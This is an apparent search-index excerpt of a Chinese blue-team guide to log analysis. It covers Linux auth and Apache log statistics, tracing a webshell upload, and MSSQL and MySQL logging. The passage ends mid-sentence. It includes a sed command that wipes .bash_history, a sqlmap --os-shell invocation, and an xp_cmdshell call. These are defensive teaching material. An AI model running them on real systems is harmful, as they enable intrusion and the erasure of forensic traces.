\u67e5\u627e\u542b\u6709\u67d0\u5b57\u7b26\u4e32\u7684\u6240\u6709\u6587\u4ef6 grep -rn \"hello,world!\" * : \u8868\u793a\u5f53\u524d\u76ee\u5f55\u6240\u6709\u6587\u4ef6\uff0c\u4e5f\u53ef\u4ee5\u662f\u67d0\u4e2a\u6587\u4ef6\u540d -r \u662f\u9012\u5f52\u67e5\u627e -n \u662f\u663e\u793a\u884c\u53f7 -R \u67e5\u627e\u6240\u6709\u6587\u4ef6\u5305\u542b\u5b50\u76ee\u5f55 -i \u5ffd\u7565\u5927\u5c0f\u5199 3\u3001\u5982\u4f55\u663e\u793a\u4e00\u4e2a\u6587\u4ef6\u7684\u67d0\u51e0\u884c\uff1a cat input_file | tail -n +1000 | head -n 2000 #\u4ece\u7b2c1000\u884c\u5f00\u59cb\uff0c\u663e\u793a2000\u884c\u3002\u5373\u663e\u793a1000~2999\u884c 4\u3001find /etc -name init //\u5728\u76ee\u5f55/etc\u4e2d\u67e5\u627e\u6587\u4ef6init 5\u3001\u53ea\u662f\u663e\u793a/etc/passwd\u7684\u8d26\u6237 `cat /etc/passwd |awk -F ':' '{print $1}'` //awk -F\u6307\u5b9a\u57df\u5206\u9694\u7b26\u4e3a':'\uff0c\u5c06\u8bb0\u5f55\u6309\u6307\u5b9a\u7684\u57df\u5206\u9694\u7b26\u5212\u5206\u57df\uff0c\u586b\u5145\u57df\uff0c$0\u5219\u8868\u793a\u6240\u6709\u57df,$1\u8868\u793a\u7b2c\u4e00\u4e2a\u57df,$n\u8868\u793a\u7b2cn\u4e2a\u57df\u3002 6\u3001sed -i '153,$d' .bash_history \u5220\u9664\u5386\u53f2\u64cd\u4f5c\u8bb0\u5f55\uff0c\u53ea\u4fdd\u7559\u524d153\u884c","title":"A\u3001\u5e38\u7528\u7684shell\u547d\u4ee4"},{"location":"blueteam/%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/#b","text":"A\u3001/var/log/secure 1\u3001\u5b9a\u4f4d\u6709\u591a\u5c11IP\u5728\u7206\u7834\u4e3b\u673a\u7684root\u5e10\u53f7\uff1a grep \"Failed password for root\" /var/log/secure | awk '{print $11}' | sort | uniq -c | sort -nr | more \u5b9a\u4f4d\u6709\u54ea\u4e9bIP\u5728\u7206\u7834\uff1a grep \"Failed password\" /var/log/secure|grep -E -o \"(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\"|uniq -c \u7206\u7834\u7528\u6237\u540d\u5b57\u5178\u662f\u4ec0\u4e48\uff1f grep \"Failed password\" /var/log/secure|perl -e 'while($_=<>){ /for(.*?) from/; print \"$1\\n\";}'|uniq -c|sort -nr 2\u3001\u767b\u5f55\u6210\u529f\u7684IP\u6709\u54ea\u4e9b\uff1a grep \"Accepted \" /var/log/secure | awk '{print $11}' | sort | uniq -c | sort -nr | more \u767b\u5f55\u6210\u529f\u7684\u65e5\u671f\u3001\u7528\u6237\u540d\u3001IP\uff1a grep \"Accepted \" /var/log/secure | awk '{print $1,$2,$3,$9,$11}' 3\u3001\u589e\u52a0\u4e00\u4e2a\u7528\u6237kali\u65e5\u5fd7\uff1a Jul 10 00:12:15 localhost useradd[2382]: new group: name=kali, GID=1001 Jul 10 00:12:15 localhost useradd[2382]: new user: name=kali, UID=1001, GID=1001, home=/home/kali , shell=/bin/bash Jul 10 00:12:58 localhost passwd: pam_unix(passwd:chauthtok): password changed for kali #grep \"useradd\" /var/log/secure 4\u3001\u5220\u9664\u7528\u6237kali\u65e5\u5fd7\uff1a Jul 10 00:14:17 localhost userdel[2393]: delete user 'kali' Jul 10 00:14:17 localhost userdel[2393]: removed group 'kali' owned by 'kali' Jul 10 00:14:17 localhost userdel[2393]: removed shadow group 'kali' owned by 'kali' # grep \"userdel\" /var/log/secure 5\u3001su\u5207\u6362\u7528\u6237\uff1a Jul 10 00:38:13 localhost su: pam_unix(su-l:session): session opened for user good by root(uid=0) sudo\u6388\u6743\u6267\u884c: sudo -l Jul 10 00:43:09 localhost sudo: good : TTY=pts/4 ; PWD=/home/good ; USER=root ; COMMAND=/sbin/shutdown -r now 2\u3001/var/log/yum.log \u8f6f\u4ef6\u5b89\u88c5\u5347\u7ea7\u5378\u8f7d\u65e5\u5fd7\uff1a ~~~yum install gcc yum install gcc [root@bogon ~]# more /var/log/yum.log Jul 10 00:18:23 Updated: cpp-4.8.5-28.el7_5.1.x86_64 Jul 10 00:18:24 Updated: libgcc-4.8.5-28.el7_5.1.x86_64 Jul 10 00:18:24 Updated: libgomp-4.8.5-28.el7_5.1.x86_64 Jul 10 00:18:28 Updated: gcc-4.8.5-28.el7_5.1.x86_64 Jul 10 00:18:28 Updated: libgcc-4.8.5-28.el7_5.1.i686 ~","title":"B\u3001\u65e5\u5fd7\u5206\u6790\u6280\u5de7"},{"location":"blueteam/%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/#3web","text":"","title":"\u7b2c3\u7bc7:Web\u65e5\u5fd7\u5206\u6790"},{"location":"blueteam/%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/#ox01-web","text":"Web\u8bbf\u95ee\u65e5\u5fd7\u8bb0\u5f55\u4e86Web\u670d\u52a1\u5668\u63a5\u6536\u5904\u7406\u8bf7\u6c42\u53ca\u8fd0\u884c\u65f6\u9519\u8bef\u7b49\u5404\u79cd\u539f\u59cb\u4fe1\u606f\u3002\u901a\u8fc7\u5bf9WEB\u65e5\u5fd7\u8fdb\u884c\u7684\u5b89\u5168\u5206\u6790\uff0c\u4e0d\u4ec5\u53ef\u4ee5\u5e2e\u52a9\u6211\u4eec\u5b9a\u4f4d\u653b\u51fb\u8005\uff0c\u8fd8\u53ef\u4ee5\u5e2e\u52a9\u6211\u4eec\u8fd8\u539f\u653b\u51fb\u8def\u5f84\uff0c\u627e\u5230\u7f51\u7ad9\u5b58\u5728\u7684\u5b89\u5168\u6f0f\u6d1e\u5e76\u8fdb\u884c\u4fee\u590d\u3002 \u6211\u4eec\u6765\u770b\u4e00\u6761Apache\u7684\u8bbf\u95ee\u65e5\u5fd7\uff1a 127.0.0.1 - - [11/Jun/2018:12:47:22 +0800] \"GET /login.html HTTP/1.1\" 200 786 \"-\" \"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36\" \u901a\u8fc7\u8fd9\u6761Web\u8bbf\u95ee\u65e5\u5fd7\uff0c\u6211\u4eec\u53ef\u4ee5\u6e05\u695a\u7684\u5f97\u77e5\u7528\u6237\u5728\u4ec0\u4e48IP\u3001\u4ec0\u4e48\u65f6\u95f4\u3001\u7528\u4ec0\u4e48\u64cd\u4f5c\u7cfb\u7edf\u3001\u4ec0\u4e48\u6d4f\u89c8\u5668\u7684\u60c5\u51b5\u4e0b\u8bbf\u95ee\u4e86\u4f60\u7f51\u7ad9\u7684\u54ea\u4e2a\u9875\u9762\uff0c\u662f\u5426\u8bbf\u95ee\u6210\u529f\u3002 \u672c\u6587\u901a\u8fc7\u4ecb\u7ecdWeb\u65e5\u5fd7\u5b89\u5168\u5206\u6790\u65f6\u7684\u601d\u8def\u548c\u5e38\u7528\u7684\u4e00\u4e9b\u6280\u5de7\u3002","title":"ox01 Web\u65e5\u5fd7"},{"location":"blueteam/%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/#0x02_2","text":"\u5728\u5bf9WEB\u65e5\u5fd7\u8fdb\u884c\u5b89\u5168\u5206\u6790\u65f6\uff0c\u4e00\u822c\u53ef\u4ee5\u6309\u7167\u4e24\u79cd\u601d\u8def\u5c55\u5f00\uff0c\u9010\u6b65\u6df1\u5165\uff0c\u8fd8\u539f\u6574\u4e2a\u653b\u51fb\u8fc7\u7a0b\u3002 \u7b2c\u4e00\u79cd\uff1a\u786e\u5b9a\u5165\u4fb5\u7684\u65f6\u95f4\u8303\u56f4\uff0c\u4ee5\u6b64\u4e3a\u7ebf\u7d22\uff0c\u67e5\u627e\u8fd9\u4e2a\u65f6\u95f4\u8303\u56f4\u5185\u53ef\u7591\u7684\u65e5\u5fd7\uff0c\u8fdb\u4e00\u6b65\u6392\u67e5\uff0c\u6700\u7ec8\u786e\u5b9a\u653b\u51fb\u8005\uff0c\u8fd8\u539f\u653b\u51fb\u8fc7\u7a0b\u3002 \u7b2c\u4e8c\u79cd\uff1a\u653b\u51fb\u8005\u5728\u5165\u4fb5\u7f51\u7ad9\u540e\uff0c\u901a\u5e38\u4f1a\u7559\u4e0b\u540e\u95e8\u7ef4\u6301\u6743\u9650\uff0c\u4ee5\u65b9\u4fbf\u518d\u6b21\u8bbf\u95ee\uff0c\u6211\u4eec\u53ef\u4ee5\u627e\u5230\u8be5\u6587\u4ef6\uff0c\u5e76\u4ee5\u6b64\u4e3a\u7ebf\u7d22\u6765\u5c55\u5f00\u5206\u6790\u3002 \u5e38\u7528\u5206\u6790\u5de5\u5177\uff1a Window\u4e0b\uff0c\u63a8\u8350\u7528 EmEditor \u8fdb\u884c\u65e5\u5fd7\u5206\u6790\uff0c\u652f\u6301\u5927\u6587\u672c\uff0c\u641c\u7d22\u6548\u7387\u8fd8\u4e0d\u9519\u3002 Linux\u4e0b\uff0c\u4f7f\u7528Shell\u547d\u4ee4\u7ec4\u5408\u67e5\u8be2\u5206\u6790\u3002 Shell+Linux\u547d\u4ee4\u5b9e\u73b0\u65e5\u5fd7\u5206\u6790\uff0c\u4e00\u822c\u7ed3\u5408grep\u3001awk\u7b49\u547d\u4ee4\u7b49\u5b9e\u73b0\u4e86\u51e0\u4e2a\u5e38\u7528\u7684\u65e5\u5fd7\u5206\u6790\u7edf\u8ba1\u6280\u5de7\u3002 Apache\u65e5\u5fd7\u5206\u6790\u6280\u5de7\uff1a 1\u3001\u5217\u51fa\u5f53\u5929\u8bbf\u95ee\u6b21\u6570\u6700\u591a\u7684IP\u547d\u4ee4\uff1a cut -d- -f 1 log_file|uniq -c | sort -rn | head -20 2\u3001\u67e5\u770b\u5f53\u5929\u6709\u591a\u5c11\u4e2aIP\u8bbf\u95ee\uff1a awk '{print $1}' log_file|sort|uniq|wc -l 3\u3001\u67e5\u770b\u67d0\u4e00\u4e2a\u9875\u9762\u88ab\u8bbf\u95ee\u7684\u6b21\u6570\uff1a grep \"/index.php\" log_file | wc -l 4\u3001\u67e5\u770b\u6bcf\u4e00\u4e2aIP\u8bbf\u95ee\u4e86\u591a\u5c11\u4e2a\u9875\u9762\uff1a awk '{++S[$1]} END {for (a in S) print a,S[a]}' log_file 5\u3001\u5c06\u6bcf\u4e2aIP\u8bbf\u95ee\u7684\u9875\u9762\u6570\u8fdb\u884c\u4ece\u5c0f\u5230\u5927\u6392\u5e8f\uff1a awk '{++S[$1]} END {for (a in S) print S[a],a}' log_file | sort -n 6\u3001\u67e5\u770b\u67d0\u4e00\u4e2aIP\u8bbf\u95ee\u4e86\u54ea\u4e9b\u9875\u9762\uff1a grep ^111.111.111.111 log_file| awk '{print $1,$7}' 7\u3001\u53bb\u6389\u641c\u7d22\u5f15\u64ce\u7edf\u8ba1\u5f53\u5929\u7684\u9875\u9762\uff1a awk '{print $12,$1}' log_file | grep ^\\\"Mozilla | awk '{print $2}' |sort | uniq | wc -l 8\u3001\u67e5\u770b2018\u5e746\u670821\u65e514\u65f6\u8fd9\u4e00\u4e2a\u5c0f\u65f6\u5185\u6709\u591a\u5c11IP\u8bbf\u95ee: awk '{print $4,$1}' log_file | grep 21/Jun/2018:14 | awk '{print $2}'| sort | uniq | wc -l","title":"0x02 \u65e5\u5fd7\u5206\u6790\u6280\u5de7"},{"location":"blueteam/%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/#0x03_1","text":"Web\u65e5\u5fd7\u5206\u6790\u5b9e\u4f8b\uff1a\u901a\u8fc7nginx\u4ee3\u7406\u8f6c\u53d1\u5230\u5185\u7f51\u67d0\u670d\u52a1\u5668\uff0c\u5185\u7f51\u670d\u52a1\u5668\u67d0\u7ad9\u70b9\u76ee\u5f55\u4e0b\u88ab\u4e0a\u4f20\u4e86\u591a\u4e2a\u56fe\u7247\u6728\u9a6c\uff0c\u867d\u7136II7\u4e0b\u4e0d\u80fd\u89e3\u6790\uff0c\u4f46\u8fd8\u662f\u60f3\u627e\u51fa\u8c01\u901a\u8fc7\u4ec0\u4e48\u8def\u5f84\u4e0a\u4f20\u7684\u3002 \u5728\u8fd9\u91cc\uff0c\u6211\u4eec\u9047\u5230\u4e86\u4e00\u4e2a\u95ee\u9898\uff1a\u7531\u4e8e\u8bbe\u7f6e\u4e86\u4ee3\u7406\u8f6c\u53d1\uff0c\u53ea\u8bb0\u5f55\u4e86\u4ee3\u7406\u670d\u52a1\u5668\u7684ip\uff0c\u5e76\u6ca1\u6709\u8bb0\u5f55\u8bbf\u95ee\u8005IP\uff1f\u8fd9\u65f6\u5019\uff0c\u5982\u4f55\u53bb\u8bc6\u522b\u4e0d\u540c\u7684\u8bbf\u95ee\u8005\u548c\u653b\u51fb\u6e90\u5462\uff1f \u8fd9\u662f\u7ba1\u7406\u5458\u65e5\u5fd7\u914d\u7f6e\u4e0d\u5f53\u7684\u95ee\u9898\uff0c\u4f46\u597d\u5728\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u6d4f\u89c8\u5668\u6307\u7eb9\u6765\u5b9a\u4f4d\u4e0d\u540c\u7684\u8bbf\u95ee\u6765\u6e90\uff0c\u8fd8\u539f\u653b\u51fb\u8def\u5f84\u3002 1\u3001\u5b9a\u4f4d\u653b\u51fb\u6e90 \u9996\u5148\u8bbf\u95ee\u56fe\u7247\u6728\u9a6c\u7684\u8bb0\u5f55\uff0c\u53ea\u627e\u5230\u4e86\u4e00\u6761\uff0c\u7531\u4e8e\u6240\u6709\u8bbf\u95ee\u65e5\u5fd7\u53ea\u8bb0\u5f55\u4e86\u4ee3\u7406IP\uff0c\u5e76\u4e0d\u80fd\u901a\u8fc7IP\u6765\u8fd8\u539f\u653b\u51fb\u8def\u5f84\uff0c\u8fd9\u65f6\u5019\uff0c\u53ef\u4ee5\u5229\u7528\u6d4f\u89c8\u5668\u6307\u7eb9\u6765\u5b9a\u4f4d\u3002 \u6d4f\u89c8\u5668\u6307\u7eb9\uff1a Mozilla/4.0+(compatible;+MSIE+7.0;+Windows+NT+6.1;+WOW64;+Trident/7.0;+SLCC2;+.NET+CLR+2.0.50727;+.NET+CLR+3.5.30729;+.NET+CLR+3.0.30729;+.NET4.0C;+.NET4.0E) 2\u3001\u641c\u7d22\u76f8\u5173\u65e5\u5fd7\u8bb0\u5f55 \u901a\u8fc7\u7b5b\u9009\u4e0e\u8be5\u6d4f\u89c8\u5668\u6307\u7eb9\u6709\u5173\u7684\u65e5\u5fd7\u8bb0\u5f55\uff0c\u53ef\u4ee5\u6e05\u6670\u5730\u770b\u5230\u653b\u51fb\u8005\u7684\u653b\u51fb\u8def\u5f84\u3002 3\u3001\u5bf9\u627e\u5230\u7684\u8bbf\u95ee\u65e5\u5fd7\u8fdb\u884c\u89e3\u8bfb\uff0c\u653b\u51fb\u8005\u5927\u81f4\u7684\u8bbf\u95ee\u8def\u5f84\u5982\u4e0b\uff1a A\u3001\u653b\u51fb\u8005\u8bbf\u95ee\u9996\u9875\u548c\u767b\u5f55\u9875 B\u3001\u653b\u51fb\u8005\u8bbf\u95eeMsgSjlb.aspx\u548cMsgSebd.aspx C\u3001\u653b\u51fb\u8005\u8bbf\u95eeXzuser.aspx D\u3001\u653b\u51fb\u8005\u591a\u6b21POST\uff08\u6000\u7591\u901a\u8fc7\u8fd9\u4e2a\u9875\u9762\u4e0a\u4f20\u6a21\u5757\u7f3a\u9677\uff09 E\u3001\u653b\u51fb\u8005\u8bbf\u95ee\u4e86\u56fe\u7247\u6728\u9a6c \u6253\u5f00\u7f51\u7ad9\uff0c\u8bbf\u95eeXzuser.aspx\uff0c\u786e\u8ba4\u653b\u51fb\u8005\u901a\u8fc7\u8be5\u9875\u9762\u7684\u8fdb\u884c\u6587\u4ef6\u4e0a\u4f20\u4e86\u56fe\u7247\u6728\u9a6c\uff0c\u540c\u65f6\uff0c\u53d1\u73b0\u7f51\u7ad9\u4e86\u5b58\u5728\u8d8a\u6743\u8bbf\u95ee\u6f0f\u6d1e\uff0c\u653b\u51fb\u8005\u8bbf\u95ee\u7279\u5b9aURL\uff0c\u65e0\u9700\u767b\u5f55\u5373\u53ef\u8fdb\u5165\u540e\u53f0\u754c\u9762\u3002\u901a\u8fc7\u65e5\u5fd7\u5206\u6790\u627e\u5230\u7f51\u7ad9\u7684\u6f0f\u6d1e\u4f4d\u7f6e\u5e76\u8fdb\u884c\u4fee\u590d\u3002","title":"0x03 \u65e5\u5fd7\u5206\u6790\u6848\u4f8b"},{"location":"blueteam/%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/#0x04_1","text":"\u7edf\u8ba1\u722c\u866b\uff1a grep - E 'Googlebot|Baiduspider' / www / logs / access .2019 - 02 - 23. log | awk '{ print $1 }' | sort | uniq \u7edf\u8ba1\u6d4f\u89c8\u5668\uff1a cat / www / logs / access .2019 - 02 - 23. log | grep - v - E 'MSIE|Firefox|Chrome|Opera|Safari|Gecko|Maxthon' | sort | uniq - c | sort - r - n | head - n 100 IP \u7edf\u8ba1\uff1a grep '23/May/2019' / www / logs / access .2019 - 02 - 23. log | awk '{print $1}' | awk - F '.' '{print $1\".\"$2\".\"$3\".\"$4}' | sort | uniq - c | sort - r - n | head - n 10 2206 219.136.134.13 1497 182.34.15.248 1431 211.140.143.100 1431 119.145.149.106 1427 61.183.15.179 1427 218.6.8.189 1422 124.232.150.171 1421 106.187.47.224 1420 61.160.220.252 1418 114.80.201.18 \u7edf\u8ba1\u7f51\u6bb5\uff1a cat / www / logs / access .2019 - 02 - 23. log | awk '{print $1}' | awk - F '.' '{print $1\".\"$2\".\"$3\".0\"}' | sort | uniq - c | sort - r - n | head - n 200 \u7edf\u8ba1\u57df\u540d\uff1a cat / www / logs / access .2019 - 02 - 23. log | awk '{print $2}' | sort | uniq - c | sort - rn | more HTTP Status\uff1a cat / www / logs / access .2019 - 02 - 23. log | awk '{print $9}' | sort | uniq - c | sort - rn | more 5056585 304 1125579 200 7602 400 5 301 URL \u7edf\u8ba1\uff1a cat / www / logs / access .2019 - 02 - 23. log | awk '{print $7}' | sort | uniq - c | sort - rn | more \u6587\u4ef6\u6d41\u91cf\u7edf\u8ba1\uff1a cat / www / logs / access .2019 - 02 - 23. log | awk '{sum[$7]+=$10}END{for(i in sum){print sum[i],i}}' | sort - rn | more grep ' 200 ' / www / logs / access .2019 - 02 - 23. log | awk '{sum[$7]+=$10}END{for(i in sum){print sum[i],i}}' | sort - rn | more URL\u8bbf\u95ee\u91cf\u7edf\u8ba1\uff1a cat / www / logs / access .2019 - 02 - 23. log | awk '{print $7}' | egrep '\\?|&' | sort | uniq - c | sort - rn | more \u811a\u672c\u8fd0\u884c\u901f\u5ea6\uff1a \u67e5\u51fa\u8fd0\u884c\u901f\u5ea6\u6700\u6162\u7684\u811a\u672c grep - v 0 $ / www / logs / access .2019 - 02 - 23. log | awk - F '\\\" ' '{print $4\" \" $1}' web . log | awk '{print $1\" \"$8}' | sort - n - k 1 - r | uniq > /tmp/slow_url.txt IP, URL \u62bd\u53d6\uff1a # tail - f / www / logs / access .2019 - 02 - 23. log | grep '/test.html' | awk '{print $1\" \"$7}' \u53c2\u8003\u94fe\u63a5\uff1a https://www.jb51.net/article/53954.htm https://www.jb51.net/article/58017.htm https://cloud.tencent.com/developer/article/1051427","title":"0x04 \u65e5\u5fd7\u7edf\u8ba1\u5206\u6790\u6280\u5de7"},{"location":"blueteam/%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/#4mssql","text":"\u5e38\u89c1\u7684\u6570\u636e\u5e93\u653b\u51fb\u5305\u62ec\u5f31\u53e3\u4ee4\u3001SQL\u6ce8\u5165\u3001\u63d0\u5347\u6743\u9650\u3001\u7a83\u53d6\u5907\u4efd\u7b49\u3002\u5bf9\u6570\u636e\u5e93\u65e5\u5fd7\u8fdb\u884c\u5206\u6790\uff0c\u53ef\u4ee5\u53d1\u73b0\u653b\u51fb\u884c\u4e3a\uff0c\u8fdb\u4e00\u6b65\u8fd8\u539f\u653b\u51fb\u573a\u666f\u53ca\u8ffd\u6eaf\u653b\u51fb\u6e90\u3002","title":"\u7b2c4\u7bc7:MSSQL\u65e5\u5fd7\u5206\u6790"},{"location":"blueteam/%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/#0x01-mssql","text":"\u9996\u5148\uff0cMSSQL\u6570\u636e\u5e93\u5e94\u542f\u7528\u65e5\u5fd7\u8bb0\u5f55\u529f\u80fd\uff0c\u9ed8\u8ba4\u914d\u7f6e\u4ec5\u9650\u5931\u8d25\u7684\u767b\u5f55\uff0c\u9700\u4fee\u6539\u4e3a\u5931\u8d25\u548c\u6210\u529f\u7684\u767b\u5f55\uff0c\u8fd9\u6837\u5c31\u53ef\u4ee5\u5bf9\u7528\u6237\u767b\u5f55\u8fdb\u884c\u5ba1\u6838\u3002 \u767b\u5f55\u5230SQL Server Management Studio\uff0c\u4f9d\u6b21\u70b9\u51fb \u7ba1\u7406--SQL Server \u65e5\u5fd7 \u53cc\u51fb\u65e5\u5fd7\u5b58\u6863\u6587\u4ef6\u5373\u53ef\u6253\u5f00\u65e5\u5fd7\u6587\u4ef6\u67e5\u770b\u5668\uff0c\u5e76\u53ef\u4ee5\u5bf9\u65e5\u5fd7\u8fdb\u884c\u7b5b\u9009\u6216\u8005\u5bfc\u51fa\u7b49\u64cd\u4f5c\u3002 \u53e6\u5916\uff0cMSSQ\u63d0\u4f9b\u4e86\u4e00\u4e2a\u5de5\u5177SQL Server Profiler \uff0c\u65b9\u4fbf\u67e5\u627e\u548c\u53d1\u73b0SQL\u6267\u884c\u7684\u6548\u7387\u548c\u8bed\u53e5\u95ee\u9898\u3002 \u65e5\u5fd7\u5206\u6790\u6848\u4f8b\uff1a \u5728\u65e5\u5fd7\u6587\u4ef6\u67e5\u770b\u5668\u4e2d\uff0c\u9009\u62e9\u7b5b\u9009\uff0c\u5728\u7b5b\u9009\u8bbe\u7f6e\u4e2d\u6e90\u8bbe\u7f6e\u4e3a\u201c\u767b\u5f55\u201d\uff0c\u5e94\u7528\u7b5b\u9009\u5668\uff0c\u786e\u5b9a\u3002 \u7b5b\u9009\u540e\u7684\u7ed3\u679c\uff0c\u53ef\u4ee5\u5f88\u6e05\u6670\u7684\u8bc6\u522b\u7528\u6237\u767b\u5f55\u4fe1\u606f\uff0c\u8bb0\u5f55\u5185\u5bb9\u5305\u62ec\u7528\u6237\u767b\u5f55\u65f6\u95f4\u3001\u767b\u5f55\u662f\u5426\u6210\u529f\u3001\u767b\u5f55\u4f7f\u7528\u7684\u8d26\u53f7\u4ee5\u53ca\u8fdc\u7a0b\u767b\u5f55\u65f6\u7528\u6237\u4f7f\u7528\u7684IP\u5730\u5740\u3002 \u5982\u4e0b\u56fe\uff1a\u5ba2\u6237\u7aef\uff1a192.168.204.1\u8fdb\u884c\u5c1d\u8bd5\u5f31\u53e3\u4ee4\u767b\u5f55\uff0c\u5e76\u53d1\u73b0\u5176\u4e2d\u6709\u4e00\u6761\u767b\u5f55\u6210\u529f\u7684\u8bb0\u5f55\u3002","title":"0x01 MSSQL\u65e5\u5fd7\u5206\u6790"},{"location":"blueteam/%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/#0x02-sql","text":"\u5728\u5229\u7528SQL\u6ce8\u5165\u6f0f\u6d1e\u7684\u8fc7\u7a0b\u4e2d\uff0c\u6211\u4eec\u4f1a\u5c1d\u8bd5\u5229\u7528sqlmap\u7684--os-shell\u53c2\u6570\u53d6\u5f97shell\uff0c\u5982\u64cd\u4f5c\u4e0d\u614e\uff0c\u53ef\u80fd\u7559\u4e0b\u4e00\u4e9bsqlmap\u521b\u5efa\u7684\u4e34\u65f6\u8868\u548c\u81ea\u5b9a\u4e49\u51fd\u6570\u3002\u6211\u4eec\u5148\u6765\u770b\u4e00\u4e0bsqlmap os-shell\u53c2\u6570\u7684\u7528\u6cd5\u4ee5\u53ca\u539f\u7406\uff1a 1\u3001\u6784\u9020\u4e00\u4e2aSQL\u6ce8\u5165\u70b9\uff0c\u5f00\u542fBurp\u76d1\u542c8080\u7aef\u53e3 sqlmap.py -u http://192.168.204.164/sql.asp?id=1 --os-shell --proxy=http://127.0.0.1:8080 HTTP\u901a\u8baf\u8fc7\u7a0b\u5982\u4e0b\uff1a \u521b\u5efa\u4e86\u4e00\u4e2a\u4e34\u65f6\u8868sqlmapoutput\uff0c\u8c03\u7528\u5b58\u50a8\u8fc7\u7a0b\u6267\u884c\u7cfb\u7edf\u547d\u4ee4\u5c06\u6570\u636e\u5199\u5165\u4e34\u65f6\u8868\uff0c\u7136\u540e\u53d6\u4e34\u65f6\u8868\u4e2d\u7684\u6570\u636e\u5c55\u793a\u5230\u524d\u7aef\u3002 \u901a\u8fc7\u67e5\u770b\u6570\u636e\u5e93\u4e2d\u6700\u8fd1\u65b0\u5efa\u7684\u8868\u7684\u7ed3\u6784\u548c\u5185\u5bb9\uff0c\u53ef\u4ee5\u5224\u65ad\u662f\u5426\u53d1\u751f\u8fc7sql\u6ce8\u5165\u6f0f\u6d1e\u653b\u51fb\u4e8b\u4ef6\u3002 \u68c0\u67e5\u65b9\u6cd5\uff1a 1\u3001\u6570\u636e\u5e93\u8868\u68c0\u67e5 2\u3001\u68c0\u67e5xp_cmdshell\u7b49\u5b58\u50a8\u8fc7\u7a0b xp_cmdshell\u5728mssql2005\u4e4b\u540e\u7684\u7248\u672c\u4e2d\u662f\u9ed8\u8ba4\u7981\u6b62\u7684\uff0c\u67e5\u770bxp_cmdshell\u662f\u5426\u88ab\u542f\u7528\u3002 `Exec master.dbo.xp_cmdshell 'whoami' 3\u3001\u9700\u8981\u7ed3\u5408web\u65e5\u5fd7\uff0c\u901a\u8fc7\u67e5\u770b\u65e5\u5fd7\u6587\u4ef6\u7684\u5927\u5c0f\u4ee5\u53ca\u5ba1\u8ba1\u65e5\u5fd7\u6587\u4ef6\u4e2d\u7684\u5185\u5bb9\uff0c\u53ef\u4ee5\u5224\u65ad\u662f\u5426\u53d1\u751f\u8fc7sql\u6ce8\u5165\u6f0f\u6d1e\u653b\u51fb\u4e8b\u4ef6\u3002","title":"0x02 SQL\u6ce8\u5165\u5165\u4fb5\u75d5\u8ff9"},{"location":"blueteam/%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/#5mysql","text":"\u5e38\u89c1\u7684\u6570\u636e\u5e93\u653b\u51fb\u5305\u62ec\u5f31\u53e3\u4ee4\u3001SQL\u6ce8\u5165\u3001\u63d0\u5347\u6743\u9650\u3001\u7a83\u53d6\u5907\u4efd\u7b49\u3002\u5bf9\u6570\u636e\u5e93\u65e5\u5fd7\u8fdb\u884c\u5206\u6790\uff0c\u53ef\u4ee5\u53d1\u73b0\u653b\u51fb\u884c\u4e3a\uff0c\u8fdb\u4e00\u6b65\u8fd8\u539f\u653b\u51fb\u573a\u666f\u53ca\u8ffd\u6eaf\u653b\u51fb\u6e90\u3002","title":"\u7b2c5\u7bc7:MySQL\u65e5\u5fd7\u5206\u6790"},{"location":"blueteam/%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/#0x01-mysql","text":"general query log\u80fd\u8bb0\u5f55\u6210\u529f\u8fde\u63a5\u548c\u6bcf\u6b21\u6267\u884c\u7684\u67e5\u8be2\uff0c\u6211\u4eec\u53ef\u4ee5\u5c06\u5b83\u7528\u4f5c\u5b89\u5168\u5e03\u9632\u7684\u4e00\u90e8\u5206\uff0c\u4e3a\u6545\u969c\u5206\u6790\u6216\u9ed1\u5ba2\u4e8b\u4ef6\u540e\u7684\u8c03\u67e5\u63d0\u4f9b\u4f9d\u636e\u3002 1\u3001\u67e5\u770blog\u914d\u7f6e\u4fe1\u606f show variables like '%general%'; 2\u3001\u5f00\u542f\u65e5\u5fd7 SET GLOBAL general_log = 'On'; 3\u3001\u6307\u5b9a\u65e5\u5fd7\u6587\u4ef6\u8def\u5f84 #SET GLOBAL general_log_file = '/var/lib/mysql/mysql.log'; \u6bd4\u5982\uff0c\u5f53\u6211\u8bbf\u95ee /test.php?id=1\uff0c\u6b64\u65f6\u6211\u4eec\u5f97\u5230\u8fd9\u6837\u7684\u65e5\u5fd7\uff1a 190604 14:46:14 14 Connect root@localhost on 14 Init DB test 14 Query SELECT * FROM admin WHERE id = 1 14 Quit ` \u6211\u4eec\u6309\u5217\u6765\u89e3\u6790\u4e00\u4e0b\uff1a \u7b2c\u4e00\u5217:Time\uff0c\u65f6\u95f4\u5217\uff0c\u524d\u9762\u4e00\u4e2a\u662f\u65e5\u671f,\u540e\u9762\u4e00\u4e2a\u662f\u5c0f\u65f6\u548c\u5206\u949f\uff0c\u6709\u4e00\u4e9b\u4e0d\u663e\u793a\u7684\u539f\u56e0\u662f\u56e0\u4e3a\u8fd9\u4e9bsql\u8bed\u53e5\u51e0\u4e4e\u662f\u540c\u65f6\u6267\u884c\u7684,\u6240\u4ee5\u5c31\u4e0d\u53e6\u5916\u8bb0\u5f55\u65f6\u95f4\u4e86\u3002 \u7b2c\u4e8c\u5217:Id\uff0c\u5c31\u662fshow 